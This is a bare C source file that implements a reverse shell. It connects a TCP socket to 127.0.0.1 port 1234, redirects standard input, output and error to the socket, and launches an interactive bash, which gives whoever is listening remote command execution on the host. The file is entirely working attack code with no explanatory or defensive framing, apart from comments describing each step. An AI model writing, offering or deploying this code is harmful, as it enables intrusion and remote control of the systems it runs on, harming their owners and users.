#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

void main() {
    int sock;
    struct sockaddr_in serv_addr;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Specify server details
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1234);  // Server port number
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");  // Server IP

    // Connect to the server
    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    // Redirect standard file descriptors to the socket
    dup2(sock, 0);  // Redirect standard input to the socket
    dup2(sock, 1);  // Redirect standard output to the socket
    dup2(sock, 2);  // Redirect standard error to the socket

    // Execute interactive shell
    execl("/bin/bash", "/bin/bash", "-i", NULL);
}

